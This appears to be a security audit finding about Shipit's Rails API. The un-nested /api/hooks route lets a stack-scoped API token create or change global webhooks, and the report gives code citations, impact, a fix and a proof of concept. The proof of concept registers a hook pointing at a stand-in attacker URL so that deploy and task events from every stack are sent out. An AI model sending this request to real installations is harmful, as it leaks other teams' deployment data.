### Title
Stack-scoped `ApiClient` can create/manage global webhooks via the un-nested `/api/hooks` endpoint, bypassing stack authorization - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Api::HooksController` is mounted twice in `config/routes.rb`: once nested under a stack (`/api/stacks/*stack_id/hooks`) and once at the top level (`/api/hooks`) [1](#0-0) . The controller's own scoping logic only restricts hooks to a stack when a `stack_id` URL param is present; when it is absent (the top-level route), it silently falls back to `Hook.where(stack_id: nil)`, i.e. **global** hooks that fire for every stack in the installation, without ever consulting `current_api_client.stack_id`.

### Finding Description
`HooksController#hooks` computes its scope from a purely local `stack_id` helper: [2](#0-1) 

```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
```

`stack` (inherited from `BaseController`) is only invoked when `params[:stack_id]` is present, and it is *that* method which actually enforces the token's stack scoping: [3](#0-2) 

```ruby
def stacks
  @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
end

def stack
  @stack ||= stacks.from_param!(params[:stack_id])
end
```

So, for the nested route, an `ApiClient` bound to a single stack (via `ApiClient#stack_id`) can only reach hooks belonging to that stack, because `stacks.from_param!` raises if the requested stack isn't the one the token is scoped to. But for the top-level route `resources :hooks, only: %i[index create show update destroy]` (no `stack_id` segment) [4](#0-3) , `params[:stack_id]` is never present, so `stack` (and therefore `current_api_client.stack_id`) is never consulted at all. The controller falls through to `Hook.where(stack_id: nil)`, which reads and writes **global** hooks - hooks with no `stack_id` — as confirmed by the `Hook#scoped?` semantics (`stack_id` presence determines whether a hook is stack-scoped or global) [5](#0-4) .

The only authorization check applied is a stack-agnostic permission string check on the `ApiClient` model: [6](#0-5) 

```ruby
def check_permissions!(operation, scope)
  required_permission = "#{operation}:#{scope}"
  unless permissions.include?(required_permission)
    raise InsufficientPermission, ...
  end
  true
end
```

`write:hook`/`read:hook` are ordinary entries in `ApiClient::PERMISSIONS` [7](#0-6) , independent of the client's `stack_id`. An admin can (and per the fixtures does) create clients that are both stack-scoped and granted these permissions, e.g. `here_come_the_walrus` scoped to `shipit` with `read:stack` [8](#0-7) ; nothing prevents adding `write:hook`/`read:hook` to such a token, and nothing in `HooksController` ties those permissions back to the client's stack scope on the un-nested route.

**Binding broken:** *the stack a token authorises (`ApiClient#stack_id`)* ≠ *the stack(s) the created/read hook actually touches (global, i.e. every stack)*. Before the attack, a stack-scoped token with `write:hook`/`read:hook` is intended to be confined to hooks for its own stack (as the nested route correctly enforces). After hitting `/api/hooks` directly, the same token can create, list, update, or delete hooks that are delivered for every deploy/rollback/task/commit-status/merge event across the entire Shipit installation, not just its authorized stack.

### Impact Explanation
Global hooks receive event payloads (`deploy`, `rollback`, `task`, `commit_status`, `merge_status`, `merge`, `pull_request`, `stack`, `review_stack`, `lock`) for **all** stacks, including ones the token was never granted access to. A holder of a narrowly-scoped, low-privilege token can:
- Register a hook (`POST /api/hooks` with an attacker-controlled `delivery_url`) that receives task/deploy output metadata and status for every stack in the installation — an unauthorized read of stack state/task/deploy information across repositories the token has no `read:stack`/`read:hook` grant for on those other stacks.
- Read (`GET /api/hooks`), modify, or delete (`PUT`/`DELETE /api/hooks/:id`) any existing global hook, potentially redirecting or disabling cross-stack notifications relied on by other integrations.

This matches the "High - ... unauthenticated read of stack state, task streams or deploy output" impact category, since the attacker did not have `read:hook`/`read:stack` scope on the other stacks whose events now leak to their exfiltration endpoint.

### Likelihood Explanation
This requires only possession of a valid `ApiClient` authentication token with `write:hook` or `read:hook` permission (no admin/session access, no GitHub credentials). Any Shipit deployment that issues per-stack scoped API tokens with hook permissions (a documented, supported combination per `ApiClient::PERMISSIONS` and the stack-scoping mechanism) is affected. The exploit is a single unauthenticated-relative-to-stack-scope HTTP request to a route that is mounted by default (`config/routes.rb`).

### Recommendation
In `Api::HooksController`, always resolve scope through `current_api_client.stack_id`, not just the URL param:
- If `current_api_client.stack_id?` is true, force `hooks`/`hook` to be scoped to that stack's `Hook` records (reject/404 any attempt to touch global hooks), regardless of whether `params[:stack_id]` was supplied.
- Only allow access to global hooks (`stack_id: nil`) for clients with `current_api_client.stack_id?` false (i.e., unscoped/administrative tokens).

### Proof of Concept
1. Admin creates an `ApiClient` scoped to `stack: "acme/webapp/production"` with permission `write:hook` (a supported combination per `ApiClient::PERMISSIONS`), intending it to manage that one stack's hooks.
2. Using that token, the attacker sends:
```
POST /api/hooks
Authorization: Basic <base64(client_id--token)>
{
  "delivery_url": "https://attacker.example.com/collect",
  "events": ["deploy", "task", "rollback"]
}
```
No `stack_id` is present in the path (unlike `/api/stacks/acme/webapp/production/hooks`), so `HooksController#stack_id` returns `nil` and `hooks.create` inserts a `Hook` with `stack_id: nil`.
3. From then on, every `deploy`/`task`/`rollback` event for **every** stack in the Shipit installation is POSTed to `https://attacker.example.com/collect`, even though the token was only ever authorized (`stack_id`) for `acme/webapp/production`.

### Citations

**File:** config/routes.rb (L42-46)
```ruby
      post '/task/:task_name' => 'tasks#trigger', as: :trigger_task
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L40-53)
```ruby
      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
    end
```

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/models/shipit/hook.rb (L84-84)
```ruby
    belongs_to :stack, required: false
```

**File:** app/models/shipit/api_client.rb (L13-21)
```ruby
    PERMISSIONS = %w[
      read:stack
      write:stack
      deploy:stack
      lock:stack
      read:hook
      write:hook
    ].freeze
    validates :permissions, subset: { of: PERMISSIONS }
```

**File:** app/models/shipit/api_client.rb (L38-45)
```ruby
    def check_permissions!(operation, scope)
      required_permission = "#{operation}:#{scope}"
      unless permissions.include?(required_permission)
        raise InsufficientPermission, "This operation requires the `#{required_permission}` permission"
      end

      true
    end
```

**File:** test/fixtures/shipit/api_clients.yml (L12-17)
```yaml
here_come_the_walrus:
  name: Here Come The Walrus
  creator: walrus
  stack: shipit
  permissions:
    - 'read:stack'
```
